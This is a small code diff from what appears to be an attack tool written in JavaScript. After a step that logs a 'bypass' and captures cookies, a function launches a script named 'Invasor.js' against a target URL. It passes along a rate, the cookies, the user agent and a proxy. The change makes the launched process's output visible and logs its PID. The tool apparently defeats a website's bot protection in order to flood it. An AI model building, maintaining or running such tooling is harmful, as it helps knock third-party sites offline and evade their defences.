@@ -235,7 +235,7 @@ async function j(targetURL, browserProxy, task, done, retries = 0) {
     a("info", `Bypassed → ${response.title} | ${response.browserProxy}`);
     a("info", `Cookies → ${response.cookies.substring(0, 80)}...`);
 
-    spawn("node", [
+    const child = spawn("node", [
       "Invasor.js",
       targetURL,
       "100",
@@ -244,7 +244,9 @@ async function j(targetURL, browserProxy, task, done, retries = 0) {
       rates,
       response.cookies,
       response.userAgent
-    ]);
+    ], { stdio: 'inherit' });
+
+    a("info", `Invasor.js started (PID: ${child.pid}) → ${response.browserProxy}`);
 
     if (browser) await browser.close();
     done(null, { task });
